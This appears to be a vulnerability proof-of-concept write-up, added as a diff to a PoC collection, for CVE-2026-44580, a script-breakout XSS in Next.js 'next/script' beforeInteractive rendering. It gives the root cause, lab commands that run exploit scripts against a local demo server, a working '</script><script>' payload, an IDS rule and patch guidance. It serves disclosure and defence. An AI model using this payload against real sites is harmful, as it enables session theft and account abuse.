@@ -1,0 +1,167 @@
+
+<!-- 
+  File: 2026-05-17_nextjs-beforeinteractive-script-xss.md
+  Location: pocs/<category>/
+-->
+
+---
+
+## Metadata
+
+| Field | Value |
+|---|---|
+| **Date Added** | 2026-05-17 |
+| **Author / Researcher** | dwisiswant0 |
+| **CVE / Advisory** | CVE-2026-44580 |
+| **Category** | web |
+| **Severity** | Medium |
+| **CVSS Score** | 6.1 (CVSSv3) |
+| **Status** | Weaponized |
+| **Tags** | XSS, next/script, beforeInteractive, Next.js, App-Router, unauthenticated |
+| **Related** | N/A |
+
+---
+
+## Affected Target
+
+| Field | Value |
+|---|---|
+| **Software / System** | Next.js applications using `next/script` with `strategy="beforeInteractive"` |
+| **Versions Affected** | 13.0.0–15.5.15 and 16.0.0–16.2.4 (fixed in 15.5.16 / 16.2.5) |
+| **Language / Platform** | JavaScript / Node.js |
+| **Authentication Required** | No |
+| **Network Access Required** | Yes |
+
+---
+
+## Summary
+
+CVE-2026-44580 is an XSS vulnerability in Next.js `next/script` rendering for `beforeInteractive` scripts. Vulnerable versions serialize script props with `JSON.stringify` and inject them into inline HTML via `dangerouslySetInnerHTML` without safe HTML escaping for `<`, `>`, and related characters. If attacker-controlled input reaches script props (for example through forwarded query parameters into `data-*` fields), payloads can break out of the inline script context and execute arbitrary JavaScript in the victim origin. The issue is rated Medium (CVSS 6.1) and fixed in 15.5.16 / 16.2.5.
+
+---
+
+## Vulnerability Details
+
+### Root Cause
+
+Pre-patch Next.js generated inline bootstrap script content using plain `JSON.stringify` and inserted it directly in a `<script>` tag with `dangerouslySetInnerHTML`. Because this bypasses React's normal escaping path, user-controlled values containing `</script><script>...` can terminate the current script block and create a new executable one.
+
+### Attack Vector
+
+An attacker supplies crafted input that an application forwards into `next/script` `beforeInteractive` props (commonly `id` or `data-*` values). When the page is rendered, the malicious string is serialized into the inline script body without HTML-safe escaping, enabling script-breakout XSS.
+
+### Impact
+
+Successful exploitation gives attacker-controlled JavaScript execution in the application's origin. This can enable session theft, account actions on behalf of users, content tampering, and abuse of trusted browser context.
+
+---
+
+## Environment / Lab Setup
+
+```
+OS:          Linux/macOS/Windows
+Target:      Next.js application on affected versions
+Attacker:    Any host able to send crafted web requests
+Tools:       python3, bash, curl
+```
+
+### Setup Steps
+
+```bash
+git clone https://github.com/dwisiswant0/next-16.2.4-pocs.git
+cd next-16.2.4-pocs/poc/CVE-2026-44580_GHSA-gx5p-jg67-6x7h
+
+python3 exploit.py
+bash exploit.sh
+```
+
+---
+
+## Proof of Concept
+
+### Step-by-Step Reproduction
+
+1. **Start the vulnerable demonstration server**.
+   ```bash
+   python3 vulnerable-app/server.py --port 8080
+   ```
+
+2. **Execute the Python exploit** against the target.
+   ```bash
+   python3 exploit.py http://127.0.0.1:8080/
+   ```
+
+3. **Confirm script-breakout behavior** using the shell PoC.
+   ```bash
+   bash exploit.sh http://127.0.0.1:8080/
+   ```
+
+### Exploit Code
+
+> See `exploit.py` and `exploit.sh` in this folder.
+
+```python
+from exploit import run
+
+exit_code = run("http://127.0.0.1:8080/")
+print(exit_code)
+```
+
+### Expected Output
+
+```
+[+] VULNERABLE -- raw </script> survived to the wire.
+Payload (decoded): </script><script>window.__pwn=true;alert("VALIDATION_TOKEN")</script><x x="
+```
+
+---
+
+## Screenshots / Evidence
+
+- `screenshots/` — add browser execution traces and response-body evidence if captured
+
+---
+
+## Detection & Indicators of Compromise
+
+```
+</script><script>alert(...)</script>
+
+```
+
+**SIEM / IDS Rule (example):**
+```
+alert http any any -> $HTTP_SERVERS any (
+  msg:"Possible Next.js beforeInteractive inline-script XSS attempt";
+  content:"</script><script>"; http_client_body;
+  sid:900044580; rev:1;
+)
+```
+
+---
+
+## Remediation
+
+| Action | Detail |
+|---|---|
+| **Patch** | Upgrade Next.js to 15.5.16 or 16.2.5+ |
+| **Workaround** | Do not pass untrusted input into `next/script` props, and sanitize values before rendering |
+| **Config Hardening** | Enforce strong output encoding guarantees and security testing around inline script generation |
+
+---
+
+## References
+
+- [CVE-2026-44580 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-44580)
+- [Next.js Security Advisory — GHSA-gx5p-jg67-6x7h](https://github.com/vercel/next.js/security/advisories/GHSA-gx5p-jg67-6x7h)
+- [Next.js Patch Commit 66f6017f15](https://github.com/vercel/next.js/commit/66f6017f156b4c6a820b6b2593f8d9cb1cebb989)
+- [Source Repository — dwisiswant0/next-16.2.4-pocs](https://github.com/dwisiswant0/next-16.2.4-pocs)
+
+---
+
+## Notes
+
+Auto-ingested from https://github.com/dwisiswant0/next-16.2.4-pocs on 2026-05-17.
+
+Issue notes indicate no known active exploitation at time of reporting.
+
